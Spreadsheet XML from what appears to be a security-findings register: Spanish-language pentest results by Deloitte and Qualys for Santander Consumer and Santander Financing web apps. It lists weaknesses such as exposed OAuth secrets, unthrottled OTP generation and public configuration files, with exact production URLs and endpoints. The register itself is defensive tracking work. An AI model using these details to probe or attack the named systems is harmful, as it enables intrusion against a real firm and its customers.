    <s v="Un atacante no autenticado podría extraer las credenciales incluidas en el código JavaScript y _x000a_utilizarlas para intentar autenticarse contra servicios internos o integraciones externas asociadas _x000a_a la aplicación. La exposición de secretos OAuth y credenciales de ambientes productivos puede _x000a_facilitar accesos no autorizados, suplantación de la aplicación cliente, obtención de tokens válidos _x000a_o abuso de APIs de terceros. Adicionalmente, debido a que la clave de ofuscación también se _x000a_encuentra expuesta, cualquier otro valor sensible protegido mediante el mismo mecanismo podría _x000a_ser recuperado fácilmente. Aunque no se verificó activamente la vigencia de las credenciales _x000a_identificadas, todas ellas deben considerarse comprometidas debido a su exposición pública."/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="343"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Aliados"/>
    <m/>
    <s v="SC-26-CNMPO-022-CO-004"/>
    <x v="142"/>
    <m/>
    <x v="2"/>
    <s v="Medium"/>
    <n v="5.3"/>
    <m/>
    <m/>
    <s v="https://aliados.santanderconsumer.co/"/>
    <m/>
    <m/>
    <d v="2026-05-20T00:00:00"/>
    <n v="34"/>
    <d v="2026-08-18T00:00:00"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="El endpoint de generación de códigos OTP no implementa mecanismos de limitación de frecuencia ni controles de protección frente a solicitudes automatizadas. Durante las pruebas realizadas se observó que el servicio permite el envío consecutivo e ilimitado de solicitudes de generación de OTP para una misma dirección de correo electrónico, respondiendo satisfactoriamente a cada petición sin aplicar bloqueos temporales, penalizaciones progresivas ni restricciones asociadas al número de _x000a_intentos realizados._x000a_Mediante automatización de peticiones consecutivas se comprobó que el sistema genera y envía un nuevo código OTP por cada solicitud recibida, permitiendo un abuso continuado del mecanismo de autenticación"/>
    <s v="Se recomienda implementar mecanismos de limitación de frecuencia (rate limiting) sobre el _x000a_endpoint de generación de códigos OTP, aplicando restricciones tanto por dirección IP como por _x000a_identificador de usuario o correo electrónico. Asimismo, se recomienda establecer límites máximos _x000a_de solicitudes permitidas en intervalos temporales definidos, aplicar bloqueos temporales _x000a_progresivos ante comportamientos anómalos e incorporar controles adicionales frente a _x000a_automatización, como mecanismos CAPTCHA o desafíos equivalentes. Adicionalmente, se _x000a_recomienda configurar una caducidad corta para los códigos OTP emitidos e invalidar _x000a_automáticamente códigos anteriores cuando se genere uno nuevo para el mismo usuario."/>
    <s v="La ausencia de mecanismos de limitación de frecuencia permite que un atacante abuse del sistema _x000a_de generación de OTP mediante automatización de solicitudes._x000a_Esta situación puede derivar en ataques de denegación funcional sobre el flujo de autenticación, _x000a_degradando la experiencia del usuario legítimo mediante el envío masivo de correos electrónicos _x000a_con códigos OTP y dificultando la identificación del código válido vigente. Adicionalmente, debido _x000a_a que los códigos generados son numéricos y de longitud reducida, el envío masivo de OTP _x000a_incrementa la probabilidad de éxito de ataques de fuerza bruta dirigidos al mecanismo de _x000a_validación. El abuso continuado del endpoint también puede generar consumo innecesario de _x000a_recursos y costes operativos asociados a plataformas de mensajería o envío de correo electrónico _x000a_utilizadas por la organización."/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="344"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Aliados"/>
    <m/>
    <s v="SC-26-CNMPO-022-CO-005"/>
    <x v="143"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <n v="2.8"/>
    <m/>
    <m/>
    <s v="https://aliados.santanderconsumer.co/"/>
    <m/>
    <m/>
    <d v="2026-05-20T00:00:00"/>
    <n v="34"/>
    <d v="2026-09-17T00:00:00"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La aplicación transmite información sensible mediante parámetros incluidos en la URL de peticiones HTTP GET. Durante el análisis se identificó el envío de datos asociados al usuario, incluyendo dirección de correo electrónico, número telefónico y documento de identificación, directamente en la cadena de consulta de la URL utilizada por el endpoint de generación de códigos OTP. Aunque parte de la información es presentada de forma enmascarada en la interfaz gráfica de usuario, los valores completos continúan siendo enviados en las solicitudes HTTP realizadas por _x000a_la aplicación"/>
    <s v="Se recomienda evitar el envío de información sensible mediante parámetros URL y utilizar _x000a_peticiones HTTP POST para transmitir dichos datos a través del cuerpo de la solicitud._x000a_Asimismo, se recomienda minimizar la exposición de datos personales en flujos de autenticación y _x000a_utilizar identificadores temporales o referencias indirectas cuando resulte necesario mantener _x000a_contexto entre solicitudes._x000a_Adicionalmente, se recomienda revisar los mecanismos de logging y monitoreo para evitar el _x000a_almacenamiento innecesario de información sensible transmitida por la aplicación"/>
    <s v="Se identifica una solicitud HTTP GET similar a la siguiente:_x000a_/used-vehicle/otpservice?email=&amp;cel=&amp;cedula=_x000a_La petición incluye información sensible directamente en parámetros de la URL, concretamente la _x000a_dirección de correo electrónico, el número telefónico y el número de identificación personal. Esta _x000a_información se observa en texto claro durante la interceptación de tráfico HTTP mediante _x000a_herramientas de análisis como Burp Suite._x000a_Debido al uso de parámetros en la URL en peticiones GET, estos valores pueden quedar registrados _x000a_en logs del servidor web, sistemas proxy intermedios, herramientas de monitoreo y observabilidad, _x000a_sistemas de trazabilidad HTTP, así como en infraestructura intermedia de red o balanceadores._x000a_Aunque la información no se muestra directamente en la barra de direcciones del navegador _x000a_durante las pruebas realizadas, los datos sensibles continúan siendo transmitidos dentro de la URL _x000a_de la petición HTTP._x000a_El impacto principal de la vulnerabilidad radica en la exposición de información sensible del usuario _x000a_a lo largo de múltiples puntos de la infraestructura, lo que incrementa la superficie de ataque y el _x000a_riesgo de acceso no autorizado a datos personales. Esta condición se presenta de forma remota y _x000a_no requiere autenticación previa, dependiendo únicamente de la capacidad de interceptar o _x000a_acceder a registros de tráfico HTTP donde se almacenen las URLs procesadas"/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="345"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Autofinance"/>
    <m/>
    <s v="SC-26-CNMPO-021-AP-001"/>
    <x v="144"/>
    <m/>
    <x v="2"/>
    <s v="Medium"/>
    <n v="6.3"/>
    <m/>
    <m/>
    <s v="https://autofinance.santanderfinancing.com/Comisiones/comisiones/v1/login/user"/>
    <m/>
    <m/>
    <d v="2026-05-20T00:00:00"/>
    <n v="34"/>
    <d v="2026-08-18T00:00:00"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Se han identificado que varios apartados de la web utilizan el mismo endpoint para la subida de ficheros que son procesados por el servidor. A continuación, se muestra el ejemplo con la funcionalidad en la pestaña de “Proveedores” aunque este mismo endpoints es utilizada por las distintas pantallas que permiten la subida de ficheros."/>
    <s v="Se recomienda establecer controles que analicen de forma automática los ficheros subidos a los _x000a_portales mencionados, ya sea mediante firmas estáticas o mediante análisis dinámico en un _x000a_entorno tipo “sandbox” así como aplicar un control exhaustivo sobre las extensiones de los ficheros _x000a_subidos por usuarios._x000a_Además como medidas internas, se recomienda categorizar y hacer inventario de los canales _x000a_comunicación externo con el objetivo de estudiar el riesgo de cada uno de ellos."/>
    <s v="Ciertas aplicaciones permiten la subida de tipos de ficheros que pueden llegar a albergar contenido _x000a_malicioso. Este contenido puede ser recibido directamente por algún empleado de la compañía sin que haya pasado por ciertos controles (análisis de antivirus, ejecución en sandbox…) que existen _x000a_típicamente en otros canales de comunicación, como el correo electrónico."/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="346"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Autofinance"/>
    <m/>
    <s v="SC-26-CNMPO-021-AP-002"/>
    <x v="145"/>
    <m/>
    <x v="2"/>
    <s v="Medium"/>
    <m/>
    <m/>
    <m/>
    <s v="https://autofinance.santanderfinancing.com/Comisiones"/>
    <m/>
    <m/>
    <d v="2026-05-20T00:00:00"/>
    <n v="34"/>
    <d v="2026-08-18T00:00:00"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="El acceso no autorizado a datos confidenciales o sensibles almacenados localmente puede tener un impacto significativo, dependiendo del tipo de información expuesta. Estos datos podrían ser utilizados por un atacante en otras fases del ataque, facilitando el compromiso de sistemas adicionales o la escalada de privilegios. Ejemplos de información sensible incluyen datos de infraestructura, manuales de usuario, mapas de red, credenciales de usuarios, scripts de inicialización de procesos, y acceso a ejecutables."/>
    <s v="Para mitigar este riesgo: _x000a_• Revisar las autorizaciones de acceso: Asegurar que el acceso a datos sensibles esté _x000a_estrictamente limitado según la estrategia de mínimo privilegio. _x000a_• Monitoreo y auditoría: Implementar controles de monitoreo y auditoría para detectar _x000a_accesos no autorizados a datos confidenciales. _x000a_• Capacitación en seguridad: Educar a los administradores del sistema y a los usuarios sobre _x000a_la importancia de proteger la información sensible y cómo hacerlo de manera efectiva."/>
    <s v="Un atacante puede abusar de otras vulnerabilidades para obtener credenciales en texto plano, tales _x000a_como XSS o simplemente acceso no monitorizado a un equipo con una cuenta autenticada. Con unas _x000a_credenciales en texto plano el atacante podría acceder a la aplicación o bien intentar la reutilización _x000a_de credenciales en otras plataformas."/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="347"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Autofinance"/>
    <m/>
    <s v="SC-26-CNMPO-021-AP-003"/>
    <x v="146"/>
    <m/>
    <x v="2"/>
    <s v="Medium"/>
    <m/>
    <m/>
    <m/>
    <s v="https://autofinance.santanderfinancing.com/Comisiones/comisiones/v1/login/user"/>
    <m/>
    <m/>
    <d v="2026-05-20T00:00:00"/>
    <n v="34"/>
    <d v="2026-08-18T00:00:00"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La aplicación analizada, utiliza un método de autenticación inseguro denominado &quot;Autenticación _x000a_Básica&quot;. En este tipo de autenticación, las credenciales de usuario se envían codificadas en base64 al _x000a_servidor, a través de la cabecera HTTP de tipo &quot;Authorization&quot;."/>
    <s v="De manera general se recomienda no utilizar el método de &quot;Autenticación Básica&quot; en el proceso de _x000a_autenticación de los usuarios._x000a_Utilizar sistemas de autenticación robustos, que autentiquen al usuario mediante identificadores _x000a_generados de manera dinámica por un algoritmo de hash robusto. Además, estos identificadores no _x000a_deben contener las credenciales de los usuarios o partes de estas."/>
    <s v="Un atacante que tuviese acceso a registros (log) de comunicación de red HTTP o a los logs de ciertos _x000a_sistemas intermedios, por ejemplo, proxies y/o servidor de backend, podría acceder a los datos de _x000a_estos registros y decodificar las credenciales transmitidas en texto claro._x000a_Por otro lado, este método de autenticación no es compatible con el uso de medidas de protección _x000a_específicas para evitar ataques de fuerza bruta."/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="348"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Autofinance"/>
    <m/>
    <s v="SC-26-CNMPO-021-AP-004"/>
    <x v="147"/>
    <m/>
    <x v="2"/>
    <s v="Medium"/>
    <m/>
    <m/>
    <m/>
    <s v="https://autofinance.santanderfinancing.com/Comisiones/comisiones/v1/login/user"/>
    <m/>
    <m/>
    <d v="2026-05-20T00:00:00"/>
    <n v="34"/>
    <d v="2026-08-18T00:00:00"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Muchas de las acciones o funcionalidades que presentan las aplicaciones requieren establecer límites en el número de veces que se puede realizar una determinada funcionalidad o acción. Las aplicaciones deben controlar que un usuario no pueda exceder un límite en el uso de estas funcionalidades ya que, en determinados casos, cada vez que se utiliza la funcionalidad afectada en el aplicativo, el usuario puede obtener algún tipo de beneficio o causar algún tipo de acción no deseada sobre la aplicación. Por ejemplo: un sitio de comercio electrónico solo puede permitir que _x000a_los usuarios apliquen un descuento una vez por transacción o se pueda valorar y/o comentar una única vez cada producto obtenido. Las vulnerabilidades relacionadas con las pruebas de los límites de función son específicas de cada aplicación en concreto y diseñar pruebas acordes a la funcionalidad y acciones de la propia _x000a_aplicación._x000a_Un atacante podría eludir la lógica de negocio y ejecutar una funcionalidad más veces de las permitidas obteniendo algún tipo de beneficio o acción malintencionada en la aplicación."/>
    <s v="La aplicación debe controlar la lógica de negocio para garantizar que una determinada _x000a_funcionalidad o acción solo puede ejecutarse un cierto número de veces limitado, cuando se _x000a_alcance el límite establecido, el usuario ya no puede ejecutar la funcionalidad._x000a_Dependiendo de la acción afectada se controlará el número de veces que una acción se puede _x000a_utilizar, o las veces que se puede utilizar en un determinado intervalo de tiempo"/>
    <s v="La ausencia de controles para evitar automatizaciones puede dar lugar a diferentes tipos de ataque _x000a_como, por ejemplo, ataques de fuerza bruta para tratar de averiguar las credenciales de un usuario, _x000a_ataques de denegación de servicio al abusar de un formulario para obtener algún tipo de descuento _x000a_y otro tipo de ataques que resultan en la evasión de la lógica de negocio de la aplicación."/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="345"/>
    <s v="SF"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="BPM"/>
    <m/>
    <s v="QA-VM-7099683207243716021"/>
    <x v="148"/>
    <m/>
    <x v="2"/>
    <s v="High"/>
    <n v="7.5"/>
    <m/>
    <m/>
    <s v="simplefinance.santanderfinancing.com"/>
    <m/>
    <m/>
    <d v="2026-05-09T00:00:00"/>
    <n v="45"/>
    <d v="2026-06-08T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="The OpenSSL software library allows secure communications over computer networks against eavesdropping or need to identify the party at the other end. OpenSSL contains an open-source implementation of the Secure Sockets Layer (SSL) and Transport Layer Security (TLS) protocols._x000a__x000a_Affected versions_x000a_from 3.6.0 before 3.6.2_x000a_from 3.5.0 before 3.5.6_x000a_from 3.4.0 before 3.4.5_x000a_from 3.3.0 before 3.3.7_x000a_from 3.0.0 before 3.0.20_x000a_from 1.1.1 before 1.1.1zg_x000a_from 1.0.2 before 1.0.2zp _x000a__x000a_QID Detection Logic (Unauthenticated):This QID matches vulnerable versions based on the exposed banner information under the OpenSSL service."/>
    <m/>
    <s v="For more information regarding these vulnerabilities, please refer to  OpenSSL Advisory._x000a_Patch:_x000a_Following are links for downloading patches to fix the vulnerabilities:_x000a_ CVE-2026-28389 CVE-2026-28388 CVE-2026-28390"/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="346"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="BPM"/>
    <m/>
    <s v="SC-26-CNMPO-020-CO-001"/>
    <x v="149"/>
    <m/>
    <x v="2"/>
    <s v="Medium"/>
    <m/>
    <m/>
    <m/>
    <s v="SISTEMAS AFECTADOS: _x000a_• https://bpm.santanderconsumer.co/Originac_x000a_ionPROD/Api/Authentication/BizagiConfig_x000a_• https://bpm.santanderconsumer.co/Originac_x000a_ionPROD/jquery/production/11.2.5.1234/des_x000a_ktop/js/common.desktop.production.js_x000a_• https://bpm.santanderconsumer.co/Originac_x000a_ionPROD/jquery/version.json.txt_x000a_• https://bpm.santanderconsumer.co/Originac_x000a_ionPROD/bizagi.cache.appcache"/>
    <m/>
    <m/>
    <d v="2026-05-14T00:00:00"/>
    <n v="40"/>
    <d v="2026-08-12T00:00:00"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La aplicación no restringe el acceso a ciertos ficheros de configuración internos de la aplicación y/o la plataforma siendo accesibles de manera pública. De esta manera, la información sensible que pudieran contener estos ficheros quedaría expuesta."/>
    <s v="Se recomienda configurar un nivel de accesos de acceso a la información para proteger los ficheros _x000a_de configuración expuestos, evitando que puedan ser accesibles de manera pública."/>
    <s v="La aplicación no restringe el acceso a ciertos ficheros de configuración internos de la aplicación y/o _x000a_la plataforma siendo accesibles de manera pública. De esta manera, la información sensible que _x000a_pudieran contener estos ficheros quedaría expuesta."/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Leidy Godoy"/>
  </r>
  <r>
    <n v="347"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="BPM"/>
    <m/>
    <s v="SC-26-CNMPO-020-CO-002"/>
    <x v="18"/>
    <m/>
    <x v="2"/>
    <s v="Medium"/>
    <m/>
    <m/>
    <m/>
    <s v="https://bpm.santanderconsumer.co/Origina_x000a_cionPROD/Api/Authentication/BizagiConfig"/>
    <m/>
    <m/>
    <d v="2026-05-14T00:00:00"/>
    <n v="40"/>
    <d v="2026-08-12T00:00:00"/>
    <x v="1"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Se ha detectado que la aplicación devuelve información acerca de rutas internas del sistema de ficheros del servidor. Esta información podría ser utilizada por un atacante con el objetivo de recabar información para ataques futuros."/>
    <s v="Se recomienda evitar que la aplicación devuelva al usuario información relativa al funcionamiento _x000a_interno del servidor, como pueden ser rutas internas o ubicación de ficheros o directorios dentro _x000a_del mismo. _x000a_Este tipo de información puede ser accesible a través de los identificadores de sesión utilizados, _x000a_mensajes de error y/o páginas por defecto."/>
    <s v="Un atacante podría aprovechar esta vulnerabilidad para obtener más información sobre el sistema _x000a_o el software instalado, pudiendo identificar el tipo de servidor, o versión de software. Esta _x000a_información le permitiría localizar vulnerabilidades existentes en los productos software instalados _x000a_y aprovecharlas para tomar el control del sistema."/>
    <s v="Sin Definir"/>
    <m/>
    <s v="Leidy Godoy"/>
  </r>
  <r>
    <n v="348"/>
    <s v="SF"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <m/>
    <m/>
    <m/>
    <x v="121"/>
    <m/>
    <x v="3"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <m/>
    <m/>
    <m/>
    <m/>
    <m/>
    <m/>
    <x v="2"/>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90750B-0A4C-4070-9C5D-1FFF734B5039}"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14" firstHeaderRow="1" firstDataRow="1" firstDataCol="1" rowPageCount="2" colPageCount="1"/>
  <pivotFields count="33">
    <pivotField showAll="0"/>
    <pivotField showAll="0"/>
    <pivotField showAll="0"/>
    <pivotField showAll="0"/>
    <pivotField showAll="0"/>
    <pivotField showAll="0"/>
    <pivotField showAll="0"/>
    <pivotField showAll="0"/>
    <pivotField showAll="0"/>
    <pivotField axis="axisRow" dataField="1" showAll="0" measureFilter="1" sortType="descending">
      <items count="240">
        <item x="212"/>
        <item x="47"/>
        <item x="65"/>
        <item x="81"/>
        <item x="198"/>
        <item x="165"/>
        <item x="40"/>
        <item x="41"/>
        <item x="36"/>
        <item x="37"/>
        <item x="42"/>
        <item x="39"/>
        <item x="38"/>
        <item x="124"/>
        <item x="122"/>
        <item x="164"/>
        <item x="119"/>
        <item x="0"/>
        <item x="49"/>
        <item x="50"/>
        <item x="7"/>
        <item x="98"/>
        <item x="3"/>
        <item x="132"/>
        <item x="8"/>
        <item x="112"/>
        <item x="58"/>
        <item x="126"/>
        <item x="72"/>
        <item x="79"/>
        <item x="88"/>
        <item x="101"/>
        <item x="146"/>
        <item x="226"/>
        <item x="35"/>
        <item x="13"/>
        <item x="85"/>
        <item x="23"/>
        <item x="29"/>
        <item x="32"/>
        <item x="26"/>
        <item x="24"/>
        <item x="167"/>
        <item x="166"/>
        <item x="138"/>
        <item x="234"/>
        <item x="120"/>
        <item x="57"/>
        <item x="157"/>
        <item x="156"/>
        <item x="109"/>
        <item x="75"/>
        <item x="121"/>
        <item x="141"/>
        <item x="227"/>
        <item x="134"/>
        <item x="168"/>
        <item x="83"/>
        <item x="61"/>
        <item x="173"/>
        <item x="153"/>
        <item x="152"/>
        <item x="4"/>
        <item x="97"/>
        <item x="211"/>
        <item x="160"/>
        <item x="14"/>
        <item x="150"/>
        <item x="115"/>
        <item x="142"/>
        <item x="230"/>
        <item x="133"/>
        <item x="170"/>
        <item x="102"/>
        <item x="236"/>
        <item x="123"/>
        <item x="28"/>
        <item x="86"/>
        <item x="80"/>
        <item x="62"/>
        <item x="129"/>
        <item x="136"/>
        <item x="56"/>
        <item x="59"/>
        <item x="78"/>
        <item x="27"/>
        <item x="127"/>
        <item x="9"/>
        <item x="20"/>
        <item x="196"/>
        <item x="90"/>
        <item x="89"/>
        <item x="110"/>
        <item x="130"/>
        <item x="103"/>
        <item x="17"/>
        <item x="15"/>
        <item x="18"/>
        <item x="171"/>
        <item x="94"/>
        <item x="172"/>
        <item x="220"/>
        <item x="202"/>
        <item x="48"/>
        <item x="34"/>
        <item x="63"/>
        <item x="33"/>
        <item x="145"/>
        <item x="177"/>
        <item x="82"/>
        <item x="19"/>
        <item x="207"/>
        <item x="128"/>
        <item x="191"/>
        <item x="106"/>
        <item x="179"/>
        <item x="206"/>
        <item x="96"/>
        <item x="99"/>
        <item x="116"/>
        <item x="169"/>
        <item x="70"/>
        <item x="232"/>
        <item x="199"/>
        <item x="131"/>
        <item x="25"/>
        <item x="60"/>
        <item x="125"/>
        <item x="159"/>
        <item x="218"/>
        <item x="148"/>
        <item x="224"/>
        <item x="209"/>
        <item x="210"/>
        <item x="174"/>
        <item x="5"/>
        <item x="193"/>
        <item x="111"/>
        <item x="12"/>
        <item x="154"/>
        <item x="228"/>
        <item x="21"/>
        <item x="143"/>
        <item x="135"/>
        <item x="195"/>
        <item x="215"/>
        <item x="100"/>
        <item x="105"/>
        <item x="238"/>
        <item x="237"/>
        <item x="189"/>
        <item x="190"/>
        <item x="201"/>
        <item x="203"/>
        <item x="233"/>
        <item x="108"/>
        <item x="117"/>
        <item x="16"/>
        <item x="213"/>
        <item x="52"/>
        <item x="64"/>
        <item x="104"/>
        <item x="107"/>
        <item x="55"/>
        <item x="54"/>
        <item x="53"/>
        <item x="140"/>
        <item x="139"/>
        <item x="77"/>
        <item x="137"/>
        <item x="6"/>
        <item x="163"/>
        <item x="235"/>
        <item x="216"/>
        <item x="178"/>
        <item x="95"/>
        <item x="2"/>
        <item x="175"/>
        <item x="176"/>
        <item x="222"/>
        <item x="1"/>
        <item x="192"/>
        <item x="231"/>
        <item x="118"/>
        <item x="114"/>
        <item x="74"/>
        <item x="73"/>
        <item x="151"/>
        <item x="161"/>
        <item x="76"/>
        <item x="31"/>
        <item x="30"/>
        <item x="93"/>
        <item x="92"/>
        <item x="91"/>
        <item x="87"/>
        <item x="68"/>
        <item x="155"/>
        <item x="194"/>
        <item x="84"/>
        <item x="149"/>
        <item x="225"/>
        <item x="162"/>
        <item x="197"/>
        <item x="221"/>
        <item x="22"/>
        <item x="223"/>
        <item x="204"/>
        <item x="214"/>
        <item x="180"/>
        <item x="181"/>
        <item x="188"/>
        <item x="183"/>
        <item x="187"/>
        <item x="11"/>
        <item x="185"/>
        <item x="186"/>
        <item x="184"/>
        <item x="158"/>
        <item x="182"/>
        <item x="46"/>
        <item x="200"/>
        <item x="113"/>
        <item x="10"/>
        <item x="147"/>
        <item x="67"/>
        <item x="69"/>
        <item x="66"/>
        <item x="219"/>
        <item x="217"/>
        <item x="144"/>
        <item x="229"/>
        <item x="208"/>
        <item x="51"/>
        <item x="205"/>
        <item x="45"/>
        <item x="44"/>
        <item x="43"/>
        <item x="71"/>
        <item t="default"/>
      </items>
      <autoSortScope>
        <pivotArea dataOnly="0" outline="0" fieldPosition="0">
          <references count="1">
            <reference field="4294967294" count="1" selected="0">
              <x v="0"/>
            </reference>
          </references>
        </pivotArea>
      </autoSortScope>
    </pivotField>
    <pivotField showAll="0"/>
    <pivotField showAll="0"/>
    <pivotField axis="axisPage" showAll="0">
      <items count="8">
        <item x="0"/>
        <item x="3"/>
        <item x="4"/>
        <item x="2"/>
        <item x="1"/>
        <item x="5"/>
        <item x="6"/>
        <item t="default"/>
      </items>
    </pivotField>
    <pivotField showAll="0"/>
    <pivotField showAll="0"/>
    <pivotField showAll="0"/>
    <pivotField showAll="0"/>
    <pivotField showAll="0"/>
    <pivotField showAll="0"/>
    <pivotField showAll="0"/>
    <pivotField showAll="0"/>
    <pivotField showAll="0"/>
    <pivotField axis="axisPage"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10">
    <i>
      <x v="69"/>
    </i>
    <i>
      <x v="17"/>
    </i>
    <i>
      <x v="19"/>
    </i>
    <i>
      <x v="97"/>
    </i>
    <i>
      <x v="145"/>
    </i>
    <i>
      <x v="180"/>
    </i>
    <i>
      <x v="220"/>
    </i>
    <i>
      <x v="70"/>
    </i>
    <i>
      <x v="95"/>
    </i>
    <i t="grand">
      <x/>
    </i>
  </rowItems>
  <colItems count="1">
    <i/>
  </colItems>
  <pageFields count="2">
    <pageField fld="22" item="2" hier="-1"/>
    <pageField fld="12" item="0" hier="-1"/>
  </pageFields>
  <dataFields count="1">
    <dataField name="Cuenta de Vulnerability description" fld="9" subtotal="count" baseField="0" baseItem="0"/>
  </dataField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EFAFC3-4670-4053-BE5C-E41D4521DBA7}"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10" firstHeaderRow="1" firstDataRow="1" firstDataCol="1" rowPageCount="2" colPageCount="1"/>
  <pivotFields count="33">
    <pivotField showAll="0"/>
    <pivotField showAll="0"/>
    <pivotField showAll="0"/>
    <pivotField showAll="0"/>
    <pivotField showAll="0"/>
    <pivotField showAll="0"/>
    <pivotField showAll="0"/>
    <pivotField showAll="0"/>
    <pivotField showAll="0"/>
    <pivotField axis="axisRow" dataField="1" showAll="0" measureFilter="1" sortType="descending">
      <items count="151">
        <item x="120"/>
        <item x="119"/>
        <item x="135"/>
        <item x="114"/>
        <item x="115"/>
        <item x="145"/>
        <item x="104"/>
        <item x="13"/>
        <item x="14"/>
        <item x="17"/>
        <item x="103"/>
        <item x="57"/>
        <item x="47"/>
        <item x="48"/>
        <item x="64"/>
        <item x="66"/>
        <item x="65"/>
        <item x="63"/>
        <item x="69"/>
        <item x="68"/>
        <item x="67"/>
        <item x="147"/>
        <item x="139"/>
        <item x="142"/>
        <item x="60"/>
        <item x="30"/>
        <item x="79"/>
        <item x="140"/>
        <item x="51"/>
        <item x="46"/>
        <item x="134"/>
        <item x="19"/>
        <item x="16"/>
        <item x="95"/>
        <item x="58"/>
        <item x="35"/>
        <item x="2"/>
        <item x="74"/>
        <item x="75"/>
        <item x="78"/>
        <item x="137"/>
        <item x="110"/>
        <item x="94"/>
        <item x="21"/>
        <item x="49"/>
        <item x="26"/>
        <item x="102"/>
        <item x="9"/>
        <item x="40"/>
        <item x="128"/>
        <item x="133"/>
        <item x="80"/>
        <item x="127"/>
        <item x="129"/>
        <item x="42"/>
        <item x="83"/>
        <item x="105"/>
        <item x="55"/>
        <item x="62"/>
        <item x="109"/>
        <item x="15"/>
        <item x="138"/>
        <item x="143"/>
        <item x="131"/>
        <item x="82"/>
        <item x="59"/>
        <item x="124"/>
        <item x="91"/>
        <item x="76"/>
        <item x="141"/>
        <item x="39"/>
        <item x="43"/>
        <item x="41"/>
        <item x="12"/>
        <item x="149"/>
        <item x="73"/>
        <item x="45"/>
        <item x="122"/>
        <item x="18"/>
        <item x="31"/>
        <item x="10"/>
        <item x="6"/>
        <item x="4"/>
        <item x="33"/>
        <item x="72"/>
        <item x="117"/>
        <item x="116"/>
        <item x="92"/>
        <item x="38"/>
        <item x="132"/>
        <item x="85"/>
        <item x="86"/>
        <item x="24"/>
        <item x="27"/>
        <item x="70"/>
        <item x="23"/>
        <item x="32"/>
        <item x="0"/>
        <item x="61"/>
        <item x="118"/>
        <item x="148"/>
        <item x="36"/>
        <item x="44"/>
        <item x="56"/>
        <item x="106"/>
        <item x="130"/>
        <item x="126"/>
        <item x="1"/>
        <item x="96"/>
        <item x="54"/>
        <item x="107"/>
        <item x="84"/>
        <item x="28"/>
        <item x="123"/>
        <item x="29"/>
        <item x="34"/>
        <item x="125"/>
        <item x="25"/>
        <item x="37"/>
        <item x="52"/>
        <item x="90"/>
        <item x="99"/>
        <item x="108"/>
        <item x="87"/>
        <item x="93"/>
        <item x="88"/>
        <item x="89"/>
        <item x="98"/>
        <item x="144"/>
        <item x="77"/>
        <item x="100"/>
        <item x="8"/>
        <item x="111"/>
        <item x="112"/>
        <item x="113"/>
        <item x="136"/>
        <item x="22"/>
        <item x="20"/>
        <item x="81"/>
        <item x="146"/>
        <item x="50"/>
        <item x="7"/>
        <item x="11"/>
        <item x="71"/>
        <item x="53"/>
        <item x="97"/>
        <item x="101"/>
        <item x="5"/>
        <item x="3"/>
        <item x="121"/>
        <item t="default"/>
      </items>
      <autoSortScope>
        <pivotArea dataOnly="0" outline="0" fieldPosition="0">
          <references count="1">
            <reference field="4294967294" count="1" selected="0">
              <x v="0"/>
            </reference>
          </references>
        </pivotArea>
      </autoSortScope>
    </pivotField>
    <pivotField showAll="0"/>
    <pivotField axis="axisPage"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6">
    <i>
      <x v="117"/>
    </i>
    <i>
      <x v="121"/>
    </i>
    <i>
      <x v="80"/>
    </i>
    <i>
      <x v="135"/>
    </i>
    <i>
      <x v="12"/>
    </i>
    <i t="grand">
      <x/>
    </i>
  </rowItems>
  <colItems count="1">
    <i/>
  </colItems>
  <pageFields count="2">
    <pageField fld="11" item="0" hier="-1"/>
    <pageField fld="22" item="1" hier="-1"/>
  </pageFields>
  <dataFields count="1">
    <dataField name="Cuenta de Vulnerability description" fld="9" subtotal="count" baseField="0" baseItem="0"/>
  </dataFields>
  <formats count="3">
    <format dxfId="34">
      <pivotArea dataOnly="0" labelOnly="1" fieldPosition="0">
